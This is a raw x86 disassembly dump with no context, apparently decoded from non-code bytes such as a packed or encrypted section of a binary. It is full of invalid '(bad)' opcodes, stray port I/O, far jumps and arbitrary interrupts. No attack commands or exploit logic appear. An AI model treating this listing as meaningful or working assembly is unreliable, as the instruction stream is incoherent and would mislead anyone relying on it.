  41cadc:	in     al,0x4f
  41cade:	push   esp
  41cadf:	or     al,0xe5
  41cae1:	add    eax,0xfbaa6dd6
  41cae6:	lods   al,BYTE PTR ds:[esi]
  41cae7:	shr    BYTE PTR [esi+0x6d],cl
  41caea:	pop    es
  41caeb:	and    cl,dh
  41caed:	sub    al,0x3d
  41caef:	adc    DWORD PTR [edi-0x350ce98],ebx
  41caf5:	cmp    esp,eax
  41caf7:	inc    ecx
  41caf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caf9:	test   DWORD PTR [edi+ebx*1-0x499234f0],ebp
  41cb00:	xchg   ebp,eax
  41cb01:	xlat   BYTE PTR ds:[ebx]
  41cb02:	loope  0x41cb25
  41cb04:	into   
  41cb05:	dec    ecx
  41cb06:	jne    0x41ca97
  41cb08:	fwait
  41cb09:	cdq    
  41cb0a:	push   edi
  41cb0b:	jmp    0xaae3:0xa474e1e6
  41cb12:	adc    edi,esp
  41cb14:	mov    gs,WORD PTR [esi-0x510569c]
  41cb1a:	xchg   ebx,eax
  41cb1b:	mov    bl,0x28
  41cb1d:	imul   edx,DWORD PTR [eax+0x251e9df9],0xfffffff6
  41cb24:	cmp    eax,DWORD PTR [esi]
  41cb26:	(bad)  
  41cb27:	xor    DWORD PTR [eax+esi*2-0x76],ebx
  41cb2b:	outs   dx,BYTE PTR ds:[esi]
  41cb2c:	inc    eax
  41cb2d:	mov    esi,0x1b317ccb
  41cb32:	dec    ebx
  41cb33:	iret   
  41cb34:	rcr    BYTE PTR [ecx+0x3d],cl
  41cb37:	in     al,dx
  41cb38:	and    eax,0xa3960c54
  41cb3d:	xchg   ebx,eax
  41cb3e:	mov    dh,0xc0
  41cb40:	push   edx
  41cb41:	mov    al,0x2a
  41cb43:	fist   DWORD PTR [ebp+0x42]
  41cb46:	inc    ebp
  41cb47:	sar    BYTE PTR [eax+0x67],1
  41cb4a:	popa   
  41cb4b:	mov    gs,WORD PTR [edi+0x3b8661c7]
  41cb51:	mov    BYTE PTR [eax+0x23],al
  41cb54:	nop    DWORD PTR [ebx+ebp*1-0x42]
  41cb59:	ds mov ebp,0xf153012d
  41cb5f:	sub    DWORD PTR [ecx+0x5103fead],ebx
  41cb65:	shl    BYTE PTR [edx+esi*1+0x72],cl
  41cb69:	test   DWORD PTR [ebp+0x3b],0xdb1adef
  41cb70:	popa   
  41cb71:	dec    esi
  41cb72:	in     al,0x9f
  41cb74:	or     dl,BYTE PTR [esi+0x4a7f7891]
  41cb7a:	sbb    DWORD PTR [ebx-0x6021dbad],0x7f
  41cb81:	inc    edi
  41cb82:	fmul   st(2),st
  41cb84:	push   cs
  41cb85:	push   edx
  41cb86:	cmp    BYTE PTR [eax+edi*2],0xe0
  41cb8a:	pop    es
  41cb8b:	sti    
  41cb8c:	lods   eax,DWORD PTR ds:[esi]
  41cb8d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41cb8f:	adc    DWORD PTR [esi],eax
  41cb91:	xchg   ebx,eax
  41cb92:	or     BYTE PTR [edx],ah
  41cb94:	popf   
  41cb95:	out    dx,eax
  41cb96:	aaa    
  41cb97:	add    dh,0x2f
  41cb9a:	fadd   QWORD PTR [esi]
  41cb9c:	xor    DWORD PTR [edi],ebp
  41cb9e:	inc    esp
  41cb9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cba0:	mov    ebp,edx
  41cba2:	popa   
  41cba3:	scas   al,BYTE PTR es:[edi]
  41cba4:	fmul   QWORD PTR [ecx+0x4caa5e3e]
  41cbaa:	jns    0x41cb30
  41cbac:	mov    dl,0xc3
  41cbae:	mov    ds:0xd3686e27,al
  41cbb3:	mov    al,0x94
  41cbb5:	mov    bh,0xa4
  41cbb7:	neg    BYTE PTR [edi+0x785d9140]
  41cbbd:	ins    DWORD PTR es:[edi],dx
  41cbbe:	loopne 0x41cb5d
  41cbc0:	xor    ebx,DWORD PTR [edi+0x7432c0db]
  41cbc6:	and    eax,DWORD PTR [ebp+0x65cfdecf]
  41cbcc:	int    0xa3
  41cbce:	in     al,0xd6
  41cbd0:	out    dx,eax
  41cbd1:	retf   0xd276
  41cbd4:	xchg   edi,eax
  41cbd5:	mov    DWORD PTR [ebx-0xb],edi
  41cbd8:	fild   WORD PTR [edx]
  41cbda:	xor    eax,0x9b13b078
  41cbdf:	sub    ah,dh
  41cbe1:	aad    0xfa
  41cbe3:	dec    esi
  41cbe4:	jl     0x41cbb6
  41cbe6:	aam    0x89
  41cbe8:	dec    ecx
  41cbe9:	mov    DWORD PTR [ebx+ecx*1-0x991c321],edx
  41cbf0:	pop    edx
  41cbf1:	and    esp,edi
  41cbf3:	mov    al,ds:0x76e32d3
  41cbf8:	out    dx,al
  41cbf9:	cli    
  41cbfa:	or     BYTE PTR [edi+0x63],bl
  41cbfd:	mov    ebp,0x8aba1f7
  41cc02:	sub    DWORD PTR [edi],0xffffffca
  41cc05:	aam    0xe0
  41cc07:	mov    cx,0xc8cd
  41cc0b:	in     al,0x91
  41cc0d:	stc    
  41cc0e:	inc    DWORD PTR [eax-0x5e5c0407]
  41cc14:	xchg   esi,eax
  41cc15:	mov    cl,0x56
  41cc17:	jmp    0x2117aa3f
  41cc1c:	je     0x41cc17
  41cc1e:	pop    edi
  41cc1f:	lock adc DWORD PTR [eax+0x7a],0xe2
	...
  41cc2f:	add    BYTE PTR [eax],al
  41cc31:	cdq    
  41cc32:	ja     0x41cc23
  41cc34:	out    dx,al
  41cc35:	out    dx,eax
  41cc36:	(bad)  
  41cc37:	cdq    
  41cc38:	ja     0x41cbcf
  41cc3a:	daa    
  41cc3b:	xor    DWORD PTR ds:0xd70c5d02,ecx
  41cc41:	imul   ecx,DWORD PTR [eax+0x1],0x3ab00
  41cc48:	add    BYTE PTR [edx+0x51],bh
  41cc4b:	push   edx
  41cc4c:	sbb    esp,DWORD PTR [eax-0x55bc3fd3]
  41cc52:	sbb    BYTE PTR [ecx-0x5e],ah
  41cc55:	push   edx
  41cc56:	iret   
  41cc57:	xor    DWORD PTR [edi],edi
  41cc59:	shr    DWORD PTR [ecx-0x533c90c6],cl
  41cc5f:	add    DWORD PTR [ebp+eiz*2-0x9b47f10],ebx
  41cc66:	ds int 0xa1
  41cc69:	adc    al,0x45
  41cc6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc6c:	in     al,dx
  41cc6d:	fnstenv [ebx-0x36]
  41cc70:	pop    edx
  41cc71:	bound  ecx,QWORD PTR ds:0x32b64663
  41cc77:	or     al,0xa5
  41cc79:	sub    DWORD PTR [edi+0x5e],eax
  41cc7c:	jge    0x41cc5a
  41cc7e:	sub    eax,0x443c8b2f
  41cc83:	call   0xb9e2:0x266a4787
  41cc8a:	cmp    al,0x3a
  41cc8c:	mov    eax,ds:0xdc3b71a8
  41cc91:	leave  
  41cc92:	leave  
  41cc93:	add    al,0x80
  41cc95:	iret   
  41cc96:	cmp    ah,BYTE PTR [edx-0x61fb0709]
  41cc9c:	lahf   
  41cc9d:	gs mov dh,0x97
  41cca0:	rol    DWORD PTR [edx-0xb6ee5e1],0xe4
  41cca7:	call   0x5b8d:0xac214bae
  41ccae:	mov    WORD PTR [edx+0xfe0c39f],fs
  41ccb4:	ret    0x42d8
  41ccb7:	cli    
  41ccb8:	add    al,BYTE PTR ds:0xaa9d788f
  41ccbe:	test   DWORD PTR [eax+0x49],0xc83a0c09
  41ccc5:	fwait
  41ccc6:	stos   DWORD PTR es:[edi],eax
  41ccc7:	sti    
  41ccc8:	das    
  41ccc9:	popa   
  41ccca:	fidivr DWORD PTR [eax+0x6d674b3]
  41ccd0:	jle    0x41cc9d
  41ccd2:	cs hlt 
  41ccd4:	push   cs
  41ccd5:	ja     0x41cc68
  41ccd7:	dec    edx
  41ccd8:	(bad)  
  41ccd9:	rcr    BYTE PTR [edx],1
  41ccdb:	mov    dh,0x89
  41ccdd:	sbb    al,0x79
  41ccdf:	jo     0x41cd2b
  41cce1:	shl    DWORD PTR [esi+0x377da515],0xc5
  41cce8:	sub    BYTE PTR [ecx],cl
  41ccea:	push   es
  41cceb:	shl    BYTE PTR [edx],1
  41cced:	and    BYTE PTR [ebx],bl
  41ccef:	or     al,BYTE PTR [ebp-0x442b04d]
  41ccf5:	in     eax,0x3
  41ccf7:	dec    ebx
  41ccf8:	and    BYTE PTR [ebp-0x223f3010],al
  41ccfe:	xlat   BYTE PTR ds:[ebx]
  41ccff:	xchg   ecx,eax
  41cd00:	pop    ds
  41cd01:	push   ebx
  41cd02:	mov    dl,0x46
  41cd04:	les    esp,FWORD PTR [edx+0x285e2996]
  41cd0a:	call   0x8ae1451e
  41cd0f:	or     eax,DWORD PTR [ebx-0x5]
  41cd12:	push   edx
  41cd13:	inc    edx
  41cd14:	dec    esp
  41cd15:	pop    ebx
  41cd16:	push   ebp
  41cd17:	dec    ebp
  41cd18:	rol    DWORD PTR [esi-0x56d0a4ad],cl
  41cd1e:	popa   
  41cd1f:	or     DWORD PTR [edi],edx
  41cd21:	sbb    al,0x4b
  41cd23:	les    eax,FWORD PTR [ecx-0x3f]
  41cd26:	and    DWORD PTR [edi+0x59ef7417],esp
  41cd2c:	xchg   esi,eax
  41cd2d:	sub    cl,BYTE PTR [ecx+0x54346171]
  41cd33:	(bad)  
  41cd34:	pop    ebx
  41cd35:	not    BYTE PTR [edi]
  41cd37:	adc    al,0xd1
  41cd39:	(bad)  
  41cd3a:	push   cs
  41cd3b:	in     eax,dx
  41cd3c:	fst    DWORD PTR [esi-0x4b8c5d90]
  41cd42:	jne    0x41cd5f
  41cd44:	jns    0x41cccc
  41cd46:	push   cs
  41cd47:	fld    QWORD PTR [ecx+0x33f43817]
  41cd4d:	fld    QWORD PTR [ebx+0x4996ef8f]
  41cd53:	lds    ecx,FWORD PTR [eax-0x2b32c69]
  41cd59:	xchg   DWORD PTR [eax-0x2c],esi
  41cd5c:	inc    edi
  41cd5d:	imul   edi,DWORD PTR [eax-0x23],0xa81089b3
  41cd64:	dec    edx
  41cd65:	outs   dx,BYTE PTR ds:[esi]
  41cd66:	fild   QWORD PTR [ebx]
  41cd68:	push   es
  41cd69:	popf   
  41cd6a:	push   0xffffffc0
  41cd6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd6d:	mov    ah,0xbb
  41cd6f:	lock mov edi,0x4acb7867
  41cd75:	aaa    
  41cd76:	jg     0x41cda0
  41cd78:	arpl   bp,di
  41cd7a:	add    al,0x57
  41cd7c:	fsqrt  
  41cd7e:	jb     0x41cdd9
  41cd80:	cdq    
  41cd81:	jo     0x41cd0d
  41cd83:	push   ebx
  41cd84:	(bad)  [edx+0x27]
  41cd87:	mov    ebx,0x1b631658
  41cd8c:	daa    
  41cd8d:	add    dh,BYTE PTR [edx]
  41cd8f:	aad    0x33
  41cd91:	jne    0x41cd3a
  41cd93:	cmp    dl,al
  41cd95:	ret    
  41cd96:	sbb    dh,bh
  41cd98:	mov    edx,0x7f69c70
  41cd9d:	nop
  41cd9e:	pop    ebx
  41cd9f:	sub    cl,BYTE PTR [edx-0x3931bc0a]
  41cda5:	push   0x32
  41cda7:	mov    eax,ds:0x7cc4af9b
  41cdac:	(bad)  
  41cdad:	iret   
  41cdae:	and    ebp,DWORD PTR [esi]
  41cdb0:	out    dx,al
  41cdb1:	jae    0x41cda4
  41cdb3:	cwde   
  41cdb4:	or     al,BYTE PTR ds:0x466467ac
  41cdba:	fdiv   DWORD PTR [edx+esi*1]
  41cdbd:	pop    es
  41cdbe:	ror    BYTE PTR [ebp+0x4a],cl
  41cdc1:	pop    ss
  41cdc2:	dec    edi
  41cdc3:	xor    eax,0xb1edf8e8
  41cdc8:	cmp    BYTE PTR [esi],bh
  41cdca:	mov    al,ds:0x2a5bbb7c
  41cdcf:	pop    es
  41cdd0:	nop
  41cdd1:	pop    ss
  41cdd2:	call   0xece3:0x75d53f41
  41cdd9:	mov    esi,0x16c8d252
  41cdde:	sbb    dl,BYTE PTR [edx-0x2b1a056e]
  41cde4:	or     ecx,DWORD PTR [edx+ebp*4+0x6d035f04]
  41cdeb:	(bad)  
  41cdec:	cmp    ecx,DWORD PTR [ebp+0x62c8f58b]
  41cdf2:	and    ebx,DWORD PTR [esi]
  41cdf4:	ret    0xdaf2
  41cdf7:	daa    
  41cdf8:	push   eax
  41cdf9:	cmp    eax,DWORD PTR [ecx+0x76b10f50]
  41cdff:	mov    BYTE PTR [ebp+0x6e34a725],bh
  41ce05:	adc    eax,0x44f60ed8
  41ce0a:	mov    eax,0xd876c194
  41ce0f:	sbb    edx,DWORD PTR [ebp-0x6c559f93]
  41ce15:	mov    ah,0x5c
  41ce17:	inc    eax
  41ce18:	test   eax,0x7baae13
  41ce1d:	scas   eax,DWORD PTR es:[edi]
  41ce1e:	not    BYTE PTR [edi+0x42]
  41ce21:	scas   eax,DWORD PTR es:[edi]
  41ce22:	xchg   DWORD PTR [edi],esi
  41ce24:	and    BYTE PTR ds:0x7b533fcb,bh
  41ce2a:	inc    edi
  41ce2b:	addr16 mov ebx,0x95f0fb28
  41ce31:	jp     0x41ce98
  41ce33:	fidivr WORD PTR [ebx+ebp*4+0x57]
  41ce37:	mov    DWORD PTR [edi-0x1ed0a7bb],eax
  41ce3d:	push   cs
  41ce3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce3f:	push   ebx
  41ce40:	in     al,0xd6
  41ce42:	push   esp
  41ce43:	data16 mov al,0x15
  41ce46:	sti    
  41ce47:	mov    dl,0x6d
  41ce49:	mov    cl,0xe3
  41ce4b:	mov    al,ds:0xdc7202cd
  41ce50:	dec    esp
  41ce51:	or     al,0xda
  41ce53:	mov    BYTE PTR [edi],bh
  41ce55:	jmp    0xe668:0x9c4008d5
  41ce5c:	push   esp
  41ce5d:	mov    esp,0xce943a30
  41ce62:	xor    eax,0xdff803a6
  41ce67:	jns    0x41ce0a
  41ce69:	popf   
  41ce6a:	xchg   DWORD PTR [edi+0x20],esi
  41ce6d:	gs popf 
  41ce6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce70:	xchg   edx,eax
  41ce71:	cmp    ebp,DWORD PTR [eax+0x2]
  41ce74:	idiv   BYTE PTR [edi+0x2751514b]
  41ce7a:	pop    esi
  41ce7b:	ds xchg ecx,eax
  41ce7d:	adc    al,bl
  41ce7f:	cld    
  41ce80:	pop    ecx
  41ce81:	or     DWORD PTR [esp+edi*4-0x44cb468e],edx
  41ce88:	movd   mm5,ebx
  41ce8b:	inc    ecx
  41ce8c:	dec    ebx
  41ce8d:	nop
  41ce8e:	xlat   BYTE PTR ds:[ebx]
  41ce8f:	pop    ebp
  41ce90:	mov    dh,0x7f
  41ce92:	dec    edx
  41ce93:	fdiv   QWORD PTR [eax+0x25aec1d9]
  41ce99:	fucom  st(5)
  41ce9b:	inc    ebx
  41ce9c:	test   DWORD PTR [eax],eax
  41ce9e:	mov    bh,0x87
  41cea0:	ret    0xdeb
  41cea3:	popf   
  41cea4:	pop    esp
  41cea5:	adc    DWORD PTR [edx+0x5e],ecx
  41cea8:	pop    ds
  41cea9:	xor    dh,BYTE PTR [edi-0x4c]
  41ceac:	or     BYTE PTR [eax+ebp*8-0x65],al
  41ceb0:	push   esp
  41ceb1:	stos   BYTE PTR es:[edi],al
  41ceb2:	test   eax,0x21530809
  41ceb7:	jb     0x41cebf
  41ceb9:	xor    dh,ch
  41cebb:	mov    ah,0x19
  41cebd:	xchg   esi,eax
  41cebe:	or     edx,DWORD PTR [edi+0x79]
  41cec1:	js     0x41cf0a
  41cec3:	xor    al,BYTE PTR [edi]
  41cec5:	mov    ch,BYTE PTR [esi+eax*8-0xe982334]
  41cecc:	int    0x4d
  41cece:	dec    esi
  41cecf:	pop    eax
  41ced0:	push   esp
  41ced1:	jge    0x41ceab
  41ced3:	xor    edi,DWORD PTR [edi-0x4]
  41ced6:	jne    0x41cf57
  41ced8:	bound  esi,QWORD PTR [eax-0x7e731434]
  41cede:	lea    ebp,[edx]
  41cee0:	ror    BYTE PTR [edx-0xa7ca702],0x51
  41cee7:	mov    WORD PTR [esi-0x2a],ss
  41ceea:	mov    ebx,DWORD PTR [ecx]
  41ceec:	sbb    DWORD PTR [esp+edi*2],ebx
  41ceef:	loop   0x41ce97
  41cef1:	inc    esi
  41cef2:	ret    0x50c0
  41cef5:	hlt    
  41cef6:	pop    esi
  41cef7:	pop    esp
  41cef8:	cwde   
  41cef9:	outs   dx,BYTE PTR ds:[esi]
  41cefa:	stos   DWORD PTR es:[edi],eax
  41cefb:	adc    eax,0x7524a6ba
  41cf00:	push   0xffffffae
  41cf02:	sbb    al,0x2d
  41cf04:	or     eax,0x416f68b0
  41cf09:	imul   edx,DWORD PTR [edi],0x3bfface6
  41cf0f:	aam    0xc
  41cf11:	popf   
  41cf12:	dec    edx
  41cf13:	aad    0x75
  41cf15:	into   
  41cf16:	ja     0x41ce98
  41cf18:	mov    edi,0xff197712
  41cf1d:	aas    
  41cf1e:	mov    esp,0x32650290
  41cf23:	pop    DWORD PTR ds:0xe02a76a5
  41cf29:	fstp   TBYTE PTR ss:[eax-0x6ca6cac]
  41cf30:	mov    cl,0x73
  41cf32:	inc    ebp
  41cf33:	jecxz  0x41cf6a
  41cf35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf36:	dec    edx
  41cf37:	jge    0x41cf7e
  41cf39:	xchg   edi,eax
  41cf3a:	or     BYTE PTR [edx],bl
  41cf3c:	arpl   WORD PTR [edx-0x32],si
  41cf3f:	bound  eax,QWORD PTR es:[edx-0x3443b063]
  41cf46:	(bad)  
  41cf47:	div    BYTE PTR [ecx*4-0x4f40f289]
  41cf4e:	popa   
  41cf4f:	add    eax,0xba3dfb2b
  41cf54:	dec    eax
  41cf55:	fisttp WORD PTR [ecx+0x63]
  41cf58:	pop    ecx
  41cf59:	(bad)  
  41cf5a:	in     al,dx
  41cf5b:	mov    cl,0x75
  41cf5d:	dec    BYTE PTR [edx-0x622dfeff]
  41cf63:	mov    ah,0x98
  41cf65:	loope  0x41cf62
  41cf67:	mov    edi,0x64c85713
  41cf6c:	add    eax,0xb397f3c4
  41cf71:	aam    0x42
  41cf73:	cmc    
  41cf74:	scas   al,BYTE PTR es:[edi]
  41cf75:	add    bh,BYTE PTR [ebp+0x34]
  41cf78:	cmp    cl,BYTE PTR [edx]
  41cf7a:	xchg   ebx,eax
  41cf7b:	dec    ebx
  41cf7c:	mov    ebx,DWORD PTR [ebx+edx*8]
  41cf7f:	or     DWORD PTR [edi-0x80],0xffffff8d
  41cf83:	inc    edx
  41cf84:	aas    
  41cf85:	bound  edx,QWORD PTR [edi]
  41cf87:	ins    DWORD PTR es:[edi],dx
  41cf88:	push   0xc492f601
  41cf8d:	cmp    esp,ebx
  41cf8f:	add    al,0x5d
  41cf91:	and    eax,0xed71ce4
  41cf96:	fadd   DWORD PTR [ecx]
  41cf98:	mov    ch,0xf1
  41cf9a:	fs movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41cf9d:	pop    esi
  41cf9e:	test   DWORD PTR [bp+di+0x26],esi
  41cfa2:	cmp    ah,bh
  41cfa4:	loope  0x41d024
  41cfa6:	bound  esi,QWORD PTR [edx-0x21]
  41cfa9:	jo     0x41cfee
  41cfab:	sub    bl,BYTE PTR [ecx+0x2a36e063]
  41cfb1:	scas   eax,DWORD PTR es:[edi]
  41cfb2:	mov    DWORD PTR [edi+esi*4-0x11],ebp
  41cfb6:	lds    eax,FWORD PTR [eax-0x2e8949fc]
  41cfbc:	repz adc al,0x98
  41cfbf:	xchg   ebp,eax
  41cfc0:	add    al,0xac
  41cfc2:	ins    BYTE PTR es:[edi],dx
  41cfc3:	lods   eax,DWORD PTR ds:[esi]
  41cfc4:	pop    ss
  41cfc5:	sub    al,0x3
  41cfc7:	dec    ecx
  41cfc8:	push   ebp
  41cfc9:	pop    esi
  41cfca:	aam    0x4e
  41cfcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfcd:	in     al,dx
  41cfce:	in     eax,dx
  41cfcf:	pop    esi
  41cfd0:	out    0x3a,eax
  41cfd2:	lods   eax,DWORD PTR ds:[esi]
  41cfd3:	pop    ecx
  41cfd4:	push   ecx
  41cfd5:	mov    ds:0x19ec3edc,eax
  41cfda:	inc    ebx
  41cfdb:	ins    DWORD PTR es:[edi],dx
  41cfdc:	jb     0x41d004
  41cfde:	xchg   DWORD PTR [edi+0x30],ecx
  41cfe1:	xlat   BYTE PTR ds:[ebx]
  41cfe2:	pop    ss
  41cfe3:	arpl   WORD PTR [ebp-0x543f8d80],sp
  41cfe9:	mov    ecx,0xbad2ed0f
  41cfee:	and    BYTE PTR [edi],al
  41cff0:	mov    ecx,0x1d756
	...
  41d001:	xchg   edx,eax
  41d002:	inc    esp
  41d003:	mov    al,BYTE PTR [edi+0x559fcfde]
  41d009:	loop   0x41cf9a
  41d00b:	aad    0x3
  41d00d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d00e:	mov    bh,0x50
  41d010:	outs   dx,DWORD PTR ds:[esi]
  41d011:	adc    al,0x4c
  41d013:	add    DWORD PTR [eax],eax
  41d015:	stos   DWORD PTR es:[edi],eax
  41d016:	add    eax,DWORD PTR [eax]
  41d018:	add    BYTE PTR [ebx-0x6],cl
  41d01b:	ds sbb ecx,edi
  41d01e:	xchg   edx,eax
  41d01f:	popf   
  41d020:	mov    eax,0x55218f66
  41d025:	mov    DWORD PTR [ebp-0x58b0618b],ebp
  41d02b:	mov    esp,0x92e35777
  41d030:	sbb    eax,0x8ee66a7c
  41d035:	in     eax,0xab
  41d037:	inc    ecx
  41d038:	aam    0xac
  41d03a:	loop   0x41cfca
  41d03c:	xchg   esp,eax
  41d03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d03e:	in     al,dx
  41d03f:	mov    al,0xe1
  41d041:	int    0x70
  41d043:	mov    al,ds:0x8b32c939
  41d048:	sbb    al,0xf1
  41d04a:	ins    BYTE PTR es:[edi],dx
  41d04b:	jecxz  0x41d000
  41d04d:	sub    dl,cl
  41d04f:	pop    esi
  41d050:	mov    ah,0x90
  41d052:	adc    ah,0xd7
  41d055:	inc    edi
  41d056:	imul   esp,edi,0xfffffff5
  41d059:	fbld   TBYTE PTR [esp+eax*8+0x31d8c67f]
  41d060:	push   esi
  41d061:	adc    BYTE PTR [eax-0x40],ch
  41d064:	mov    edx,eax
  41d066:	loope  0x41d0e5
  41d068:	and    DWORD PTR [eax+eiz*2],esp
  41d06b:	jle    0x41d002
  41d06d:	inc    ebx
  41d06e:	and    BYTE PTR [edx-0x3c],bl
  41d071:	pop    ebx
  41d072:	nop
  41d073:	sbb    edi,DWORD PTR [esi+eax*2-0x3b0d84cd]
  41d07a:	dec    ebp
  41d07b:	pop    eax
  41d07c:	pop    es
  41d07d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d07e:	retf   0xaf04
  41d081:	and    DWORD PTR [eax+0x5abc07a9],0x7
  41d088:	xor    eax,DWORD PTR [ecx+0x7c8552f6]
  41d08e:	out    dx,al
  41d08f:	push   0xffffffae
  41d091:	(bad)  
  41d092:	bound  edx,QWORD PTR [esi-0x40]
  41d095:	aad    0xc7
  41d097:	push   ss
  41d098:	mov    WORD PTR [ebx-0x4d22ecea],gs
  41d09e:	cld    
  41d09f:	jp     0x41d06e
  41d0a1:	rcr    DWORD PTR [edx+edi*1],0xd6
  41d0a5:	add    eax,0x85fa0dff
  41d0aa:	(bad)  
  41d0ab:	aas    
  41d0ac:	pop    eax
  41d0ad:	retf   
  41d0ae:	xchg   edx,eax
  41d0af:	mov    edi,0x2ab89a92
  41d0b4:	xchg   ebx,eax
  41d0b5:	jnp    0x41d0b8
  41d0b7:	sbb    bl,al
  41d0b9:	add    ah,BYTE PTR [ecx]
  41d0bb:	adc    DWORD PTR [eax-0x60],ebx
  41d0be:	shl    DWORD PTR [ebp+0x3614a5a9],0x93
  41d0c5:	pop    ds
  41d0c6:	add    al,0x31
  41d0c8:	aam    0x6d
  41d0ca:	fs xchg esp,eax
  41d0cc:	dec    ebx
  41d0cd:	mov    ch,BYTE PTR [ebx+0x538da763]
  41d0d3:	or     edi,ecx
  41d0d5:	dec    ecx
  41d0d6:	sahf   
  41d0d7:	or     al,0x72
  41d0d9:	dec    esp
  41d0da:	push   0x5a573a5a
  41d0df:	sahf   
  41d0e0:	adc    BYTE PTR [esi],ah
  41d0e2:	push   edi
  41d0e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0e4:	sbb    ah,0x9d
  41d0e7:	xor    BYTE PTR [ebx],bl
  41d0e9:	dec    ecx
  41d0ea:	xchg   esp,eax
  41d0eb:	in     eax,dx
  41d0ec:	pop    ebp
  41d0ed:	mov    BYTE PTR [edi+0x7d],0xf1
  41d0f1:	cmp    eax,DWORD PTR [ecx+0x3bc2193]
  41d0f7:	mov    ds:0x90c91bde,al
  41d0fc:	std    
  41d0fd:	or     ebx,DWORD PTR [esi-0x394e75b0]
  41d103:	inc    esi
  41d104:	and    ecx,DWORD PTR [esi]
  41d106:	jecxz  0x41d090
  41d108:	ret    0x7a48
  41d10b:	ins    BYTE PTR es:[edi],dx
  41d10c:	gs mov WORD PTR fs:[eax+0x2374656],gs
  41d114:	mov    al,ds:0xe02c534
  41d119:	mov    bl,0xe6
  41d11b:	and    eax,0xec2379f5
  41d120:	test   eax,0xcc97e2fd
  41d125:	cmp    DWORD PTR [ecx+0x4a67201c],0xe6254b95
  41d12f:	aas    
  41d130:	fisttp QWORD PTR [ecx+0x4]
  41d133:	dec    edi
  41d134:	pop    edx
  41d135:	stc    
  41d136:	pop    edi
  41d137:	jmp    0x5cc14253
  41d13c:	out    0x3a,eax
  41d13e:	stos   DWORD PTR es:[edi],eax
  41d13f:	or     DWORD PTR [ecx+ebp*2-0x3278180c],ebx
  41d146:	enter  0x158f,0xec
  41d14a:	(bad)  [ecx+ebx*8]
  41d14d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d14e:	aaa    
  41d14f:	xchg   edx,eax
  41d150:	sar    BYTE PTR [eax+0x74],cl
  41d153:	loope  0x41d1cb
  41d155:	adc    esi,DWORD PTR ss:[edi]
  41d158:	fwait
  41d159:	repz std 
  41d15b:	xor    al,ah
  41d15d:	adc    BYTE PTR [ebp-0x55],bl
  41d160:	pop    edi
  41d161:	int    0xeb
  41d163:	clc    
  41d164:	xchg   ebx,eax
  41d165:	jl     0x41d1cb
  41d167:	and    BYTE PTR [ecx+edi*2-0x305de8ba],bh
  41d16e:	mov    DWORD PTR [edx-0x78],ecx
  41d171:	je     0x41d1cc
  41d173:	jns    0x41d138
  41d175:	and    dx,WORD PTR [ebx+0x3a]
  41d179:	inc    esi
  41d17a:	(bad)  
  41d17b:	push   esi
  41d17c:	int3   
  41d17d:	retf   
  41d17e:	or     BYTE PTR [edi-0x689a177d],0xf6
  41d185:	fld    st(0)
  41d187:	arpl   WORD PTR [ebx+0x28],ax
  41d18a:	xchg   ecx,eax
  41d18b:	mov    ecx,DWORD PTR [ebx]
  41d18d:	leave  
  41d18e:	rol    BYTE PTR [esi+0x2bd8999f],1
  41d194:	xchg   BYTE PTR [edi-0x19593663],dl
  41d19a:	icebp  
  41d19b:	sub    al,0x1b
  41d19d:	in     eax,0xf4
  41d19f:	cmp    bh,BYTE PTR [ebx+0x661d4e5d]
  41d1a5:	mov    ss,edx
  41d1a7:	adc    BYTE PTR [edx],0xf1
  41d1aa:	or     esp,ebx
  41d1ac:	test   BYTE PTR [edi],cl
  41d1ae:	push   edx
  41d1af:	test   eax,0x713723f8
  41d1b4:	mov    ds:0x3c26a92,al
  41d1b9:	sbb    eax,0xc98e380e
  41d1be:	xor    edx,DWORD PTR [ebx-0x73815bea]
  41d1c4:	ret    
  41d1c5:	dec    ebp
  41d1c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1c7:	repz cmp BYTE PTR [ecx-0x8],ah
  41d1cb:	cdq    
  41d1cc:	or     DWORD PTR [ebx+0x2f],ebp
  41d1cf:	xchg   ebx,eax
  41d1d0:	mov    BYTE PTR [edx+0x6d2f58ea],0x73
  41d1d7:	or     BYTE PTR [ebx+0x4a],0x93
  41d1db:	mov    ebx,DWORD PTR [esi-0x1e]
  41d1de:	sbb    eax,0x8f284e7
  41d1e3:	in     al,dx
  41d1e4:	pop    ds
  41d1e5:	ret    
  41d1e6:	popf   
  41d1e7:	fisub  DWORD PTR [ebx-0x3d]
  41d1ea:	pop    eax
  41d1eb:	cmp    al,0x83
  41d1ed:	hlt    
  41d1ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1ef:	xchg   edi,eax
  41d1f0:	and    eax,0x7f289e58
  41d1f5:	jb     0x41d1d8
  41d1f7:	push   0x5
  41d1f9:	jge    0x41d182
  41d1fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1fc:	mov    esp,0xb41432b
  41d201:	xor    dl,BYTE PTR [edi]
  41d203:	fsubr  QWORD PTR [eax+0x4770a95f]
  41d209:	jecxz  0x41d23b
  41d20b:	and    BYTE PTR [eax+0xc7faef4],cl
  41d211:	(bad)  
  41d212:	lds    ecx,FWORD PTR [edx+0x4bd46da5]
  41d218:	test   DWORD PTR [eax-0x2f4adef4],0xf1bae979
  41d222:	lds    ebp,FWORD PTR [ecx]
  41d224:	or     dl,BYTE PTR [ecx-0x5410da4b]
  41d22a:	in     al,0x6e
  41d22c:	and    BYTE PTR [esi],cl
  41d22e:	jno    0x41d22c
  41d230:	xor    ebx,eax
  41d232:	test   al,0x0
  41d234:	fmul   QWORD PTR [edi]
  41d236:	inc    esp
